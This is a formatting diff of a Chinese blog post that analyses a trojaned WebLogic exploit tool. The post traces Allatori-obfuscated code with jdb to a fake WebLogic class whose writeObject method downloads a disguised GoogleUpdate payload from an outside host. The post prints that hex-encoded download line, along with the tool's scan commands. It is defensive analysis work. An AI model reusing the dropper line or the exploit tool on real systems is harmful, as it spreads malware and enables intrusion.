@@ -16,7 +16,7 @@ tags:
 
   
 
-大概在4月19号，我们注意到某步社区中有一个匿名帖子，贴子地址：https://m.threatbook.cn/detail/6192  
+大概在 4 月 19 号，我们注意到某步社区中有一个匿名帖子，贴子地址：https://m.threatbook.cn/detail/6192  
 
   
 
@@ -28,7 +28,7 @@ tags:
 
   
 
-其中提到了一个weblogic漏洞利用工具，项目地址是https://github.com/DesaiParekh/weblogic\_cmd\_plus （截至发文，项目已被删除）
+其中提到了一个 weblogic 漏洞利用工具，项目地址是 https://github.com/DesaiParekh/weblogic\_cmd\_plus（截至发文，项目已被删除）
 
   
 
@@ -56,15 +56,15 @@ java -jar weblogic_cmd_plus.jar -scanip 127.0.0.1 -scanport 7001 -scan
 
 ![图片](assets/1711884809-645a208e8d32ee2e615e477b6bded53e.png)
 
-把项目脱到idea中，反编译jar包，随便查看了一些class文件，发现看不到具体的源码，只能看到如下图这种类似类声明的内容  
+把项目脱到 idea 中，反编译 jar 包，随便查看了一些 class 文件，发现看不到具体的源码，只能看到如下图这种类似类声明的内容  
 
 ![图片](assets/1711884809-b59b4563c023a78c122fdedb35da8f19.png)
 
-因为这个T3VulnerabilityCheck.class大概有13k，所以内容不太可能是这种类声明
+因为这个 T3VulnerabilityCheck.class 大概有 13k，所以内容不太可能是这种类声明
 
 ![图片](assets/1711884809-bd681e2d305a1280db5446637b431703.png)
 
-尝试使用javap查看对应字节码，如下图
+尝试使用 javap 查看对应字节码，如下图
 
 ![图片](assets/1711884809-b7131bad92afd65b4bae1e74af55ba77.png)
 
@@ -74,11 +74,11 @@ java -jar weblogic_cmd_plus.jar -scanip 127.0.0.1 -scanport 7001 -scan
 ALLATORIxDEMO
 ```
 
-在互联网搜索一下这个字符串，发现这个字符串是一款java混淆工具加密后特有的内容
+在互联网搜索一下这个字符串，发现这个字符串是一款 java 混淆工具加密后特有的内容
 
   
 
-这款java混淆工具名字叫Allatori，官网是http://www.allatori.com/
+这款 java 混淆工具名字叫 Allatori，官网是 http://www.allatori.com/
 
   
 
@@ -86,7 +86,7 @@ ALLATORIxDEMO
 
   
 
-（当然我们如果直接运行工具也可以看到使用了Allatori，因为工具运行后直接就输出了Allatori![图片](assets/1711884809-292728f694c213f09a48a4b2b3c81375.png)）
+（当然我们如果直接运行工具也可以看到使用了 Allatori，因为工具运行后直接就输出了 Allatori![图片](assets/1711884809-292728f694c213f09a48a4b2b3c81375.png)）
 
   
 
@@ -96,7 +96,7 @@ ALLATORIxDEMO
 
   
 
-把工具放到虚拟机里运行，打开各种分析工具，开始分析这个jar包的行为
+把工具放到虚拟机里运行，打开各种分析工具，开始分析这个 jar 包的行为
 
   
 
@@ -114,11 +114,11 @@ java -jar weblogic_cmd_plus.jar -scanip 192.168.0.1/24 -scanport 7001 -scan -t 2
 
 ![图片](assets/1711884809-0740ab90e63d7f0fec2add769c83fc54.png)
 
-怎么突然多了个GoogleUpdate.exe？
+怎么突然多了个 GoogleUpdate.exe？
 
 ![图片](assets/1711884809-fab7e2d64085bc09d6ef10ee91c24c80.png)
 
-好家伙，你一个GoogleUpdate.exe用的腾讯的签名？难道说？   
+好家伙，你一个 GoogleUpdate.exe 用的腾讯的签名？难道说？   
 
 - - -
 
@@ -126,41 +126,41 @@ java -jar weblogic_cmd_plus.jar -scanip 192.168.0.1/24 -scanport 7001 -scan -t 2
 
   
 
-在上一步已经明确了这个工具有问题，这里我们开始分析这个jar包到底是如何工作的  
+在上一步已经明确了这个工具有问题，这里我们开始分析这个 jar 包到底是如何工作的  
 
   
 
-因为在idea中反编译效果太差，我一度想硬扣一下字节码
+因为在 idea 中反编译效果太差，我一度想硬扣一下字节码
 
   
 
-把反编译工具换成jadx以后，内容正常了
+把反编译工具换成 jadx 以后，内容正常了
 
   
 
-代码中很多地方都使用了Allatori进行加密，我在想是不是应该去解密一下，在网上找到一篇介绍Allatori如何加密的，学习了一下，地址如下https://zhuanlan.zhihu.com/p/342386478
+代码中很多地方都使用了 Allatori 进行加密，我在想是不是应该去解密一下，在网上找到一篇介绍 Allatori 如何加密的，学习了一下，地址如下 https://zhuanlan.zhihu.com/p/342386478
 
   
 
-文章中提到Allatori大概有两种加密方式，一种是强加密方式，会通过调用堆栈获取到当前执行的类、方法名（不太严谨）作为解密的依据，另外一种是简单的运算，算法比较简单
+文章中提到 Allatori 大概有两种加密方式，一种是强加密方式，会通过调用堆栈获取到当前执行的类、方法名（不太严谨）作为解密的依据，另外一种是简单的运算，算法比较简单
 
   
 
-找了一会解密Allatori的工具，用了几个都失败了，不过这里工具混淆的内容相对好一点，代码不解密其实也可以看出来一些实现的逻辑
+找了一会解密 Allatori 的工具，用了几个都失败了，不过这里工具混淆的内容相对好一点，代码不解密其实也可以看出来一些实现的逻辑
 
   
 
-正好刚才我们在样本测试的时候发现，这个工具的恶意代码触发逻辑可能是和ip有关，我们就重点关注一下ip处理相关的类
+正好刚才我们在样本测试的时候发现，这个工具的恶意代码触发逻辑可能是和 ip 有关，我们就重点关注一下 ip 处理相关的类
 
   
 
-发现com.supeream.utils.IpUtil这个类可能有一些问题
+发现 com.supeream.utils.IpUtil 这个类可能有一些问题
 
   
 
-第一，他在import的时候居然引用了java.io.ObjectOutputStream，java.lang.reflect.Constructor，sun.misc.Unsafe这三个类
+第一，他在 import 的时候居然引用了 java.io.ObjectOutputStream，java.lang.reflect.Constructor，sun.misc.Unsafe 这三个类
 
-第二，在getIpFromString这个方法里使用了Class.forName和writeObject
+第二，在 getIpFromString 这个方法里使用了 Class.forName 和 writeObject
 
   
 
@@ -172,35 +172,35 @@ java -jar weblogic_cmd_plus.jar -scanip 192.168.0.1/24 -scanport 7001 -scan -t 2
 
   
 
-其实这种加密我们在代码里都可以找到对应解密方式，本地自己实现一个解密也很快，查看了我们可能会重点关注的类以后，发现那些类都使用的强加密方式（堆栈方式），思考了一会决定不在加解密下功夫，尝试debug一下这个jar包
+其实这种加密我们在代码里都可以找到对应解密方式，本地自己实现一个解密也很快，查看了我们可能会重点关注的类以后，发现那些类都使用的强加密方式（堆栈方式），思考了一会决定不在加解密下功夫，尝试 debug 一下这个 jar 包
 
   
 
-在idea里用几个方法debug都失败了（可能是我环境没配置对），无语，换个思路  
+在 idea 里用几个方法 debug 都失败了（可能是我环境没配置对），无语，换个思路  
 
   
 
-想了一下还是用最古老的方法debug最稳当
+想了一下还是用最古老的方法 debug 最稳当
 
   
 
-使用jdb来debug这个jar包
+使用 jdb 来 debug 这个 jar 包
 
   
 
-jar运行开启debug模式
+jar 运行开启 debug 模式
 
 ```plain
 java -Xdebug -Xrunjdwp:transport=dt_socket,address=javadebug,server=y,suspend=y -jar weblogic_cmd_plus.jar -scanip 192.168.0.1/24 -scanport 7001 -scan -t 20
 ```
 
-使用jdb连接（这里的port是随机的，我这里直接粘贴我的配置了）
+使用 jdb 连接（这里的 port 是随机的，我这里直接粘贴我的配置了）
 
 ```plain
 jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=49226
 ```
 
-在main方法打一个断点，然后运行
+在 main 方法打一个断点，然后运行
 
 ```plain
 stop in com.supeream.Main.main
@@ -208,13 +208,13 @@ stop in com.supeream.Main.main
 run
 ```
 
-开始慢慢debug
+开始慢慢 debug
 
 ![图片](assets/1711884809-c59adbae0f3b60fcd7e65580f5e3fe42.png)
 
-大概执行了无数次step以后，我终于想起来我是来解密class.forName到底是加载什么类的
+大概执行了无数次 step 以后，我终于想起来我是来解密 class.forName 到底是加载什么类的
 
-重新debug，设置断点  
+重新 debug，设置断点  
 
 ```plain
 stop in com.supeream.utils.IpUtil.getIpFromString
@@ -222,35 +222,35 @@ stop in com.supeream.utils.IpUtil.getIpFromString
 run
 ```
 
-step了一会，我们进入到com.supeream.serial.BytesOperation这个类
+step 了一会，我们进入到 com.supeream.serial.BytesOperation 这个类
 
-现在我们可以使用这个类的hexStringToString在jdb中解码了
+现在我们可以使用这个类的 hexStringToString 在 jdb 中解码了
 
 ```plain
 eval com.supeream.serial.BytesOperation.hexStringToString("7765626c6f6769632e6a3265652e64657363726970746f722e496e746572636570746f724265616e496d706c")
 ```
 
-解码后内容是weblogic.j2ee.descriptor.InterceptorBeanImpl
+解码后内容是 weblogic.j2ee.descriptor.InterceptorBeanImpl
 
 ![图片](assets/1711884809-061626700d609f09f40eb059a9e98dff.png)
 
-当然，如果继续跟代码，也会进入到weblogic.j2ee.descriptor.InterceptorBeanImpl这个类中
+当然，如果继续跟代码，也会进入到 weblogic.j2ee.descriptor.InterceptorBeanImpl 这个类中
 
   
 
-使用jadx打开weblogic.j2ee.descriptor.InterceptorBeanImpl这个类，我差点笑出了声，如果真的是weblogic的类，会import一个com.github.kevinsawicki.http.HttpRequest嘛？
+使用 jadx 打开 weblogic.j2ee.descriptor.InterceptorBeanImpl 这个类，我差点笑出了声，如果真的是 weblogic 的类，会 import 一个 com.github.kevinsawicki.http.HttpRequest 嘛？
 
   
 
 ![图片](assets/1711884809-4b344cb02f62f7e738238f2821c88993.png)
 
-结合之前getIpFromString出现过的writeObject，我想起来一个java反序列化中的一个小知识点  
+结合之前 getIpFromString 出现过的 writeObject，我想起来一个 java 反序列化中的一个小知识点  
 
 ```plain
-当对某一个类进行序列化的时候，如果目标类自己实现了writeObject，会调用目标类自己实现的writeObject
+当对某一个类进行序列化的时候，如果目标类自己实现了 writeObject，会调用目标类自己实现的 writeObject
 ```
 
-根据这个小知识点，我在InterceptorBeanImpl里搜索一下writeObject
+根据这个小知识点，我在 InterceptorBeanImpl 里搜索一下 writeObject
 
   
 
@@ -260,13 +260,13 @@ eval com.supeream.serial.BytesOperation.hexStringToString("7765626c6f6769632e6a
 
 ![图片](assets/1711884809-02b07d5fb7fee98c05cd5669eae392b9.png)
 
-仔细观察这个writeObject，发现他使用com.github.kevinsawicki.http.HttpRequet.get去下载了一个文件
+仔细观察这个 writeObject，发现他使用 com.github.kevinsawicki.http.HttpRequet.get 去下载了一个文件
 
 ```plain
 HttpRequest.get(hexStringToString("68747470733a2f2f67697465652e636f6d2f666f786b696e673030372f666f7872617069642d6b696e672f6174746163685f66696c65732f3637313939372f646f776e6c6f61642f476f6f676c655570646174652e7a6970")).receive(new File(hexStringToString2));
 ```
 
-本地实现一下这个hexStringToString  
+本地实现一下这个 hexStringToString  
 
 解码内容如下
 
